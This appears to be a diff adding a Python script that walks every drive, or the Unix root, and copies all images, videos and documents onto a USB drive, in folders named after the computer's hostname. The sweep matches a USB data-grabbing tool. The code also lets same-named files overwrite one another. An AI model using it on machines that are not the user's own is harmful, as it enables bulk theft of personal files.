@@ -1,0 +1,66 @@
+import os
+import shutil
+import platform
+import string
+from pathlib import Path
+
+# Define file extensions
+IMAGE_EXTENSIONS = ('.png', '.jpg', '.jpeg', '.gif', '.bmp', '.tiff')
+VIDEO_EXTENSIONS = ('.mp4', '.avi', '.mov', '.mkv', '.flv')
+DOCUMENT_EXTENSIONS = ('.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.txt')
+
+# Get computer name
+computer_name = platform.node()
+
+# Function to list all drives (Windows specific)
+def list_drives():
+    drives = []
+    for drive in string.ascii_uppercase:
+        drive_path = f"{drive}:\\"
+        if os.path.exists(drive_path):
+            drives.append(drive_path)
+    return drives
+
+# Function to copy files
+def copy_files(source_dirs, dest_folder, extensions):
+    for directory in source_dirs:
+        for root, _, files in os.walk(directory):
+            for file in files:
+                if file.lower().endswith(extensions):
+                    source_file = os.path.join(root, file)
+                    dest_file = os.path.join(dest_folder, file)
+                    shutil.copy2(source_file, dest_file)
+                    print(f"Copied {source_file} to {dest_file}")
+
+# Identify USB drive (this might need to be adjusted based on the operating system and how the USB is mounted)
+usb_path = '/path/to/usb/drive'  # Adjust this to the correct path of the mounted USB drive
+
+# Ensure the USB drive path exists
+if not os.path.exists(usb_path):
+    raise ValueError(f"USB path '{usb_path}' does not exist. Please check the path and try again.")
+
+# Create folders on the USB drive
+image_folder = os.path.join(usb_path, f'{computer_name}_images')
+video_folder = os.path.join(usb_path, f'{computer_name}_videos')
+document_folder = os.path.join(usb_path, f'{computer_name}_documents')
+
+os.makedirs(image_folder, exist_ok=True)
+os.makedirs(video_folder, exist_ok=True)
+os.makedirs(document_folder, exist_ok=True)
+
+# Get all drives
+all_drives = list_drives()
+
+# Add root directory for Unix-like systems
+if os.name == 'posix':
+    all_drives.append('/')
+
+# Copy images, videos, and documents to USB drive
+print("Copying images...")
+copy_files(all_drives, image_folder, IMAGE_EXTENSIONS)
+print("Copying videos...")
+copy_files(all_drives, video_folder, VIDEO_EXTENSIONS)
+print("Copying documents...")
+copy_files(all_drives, document_folder, DOCUMENT_EXTENSIONS)
+
+print("All files have been copied successfully.")
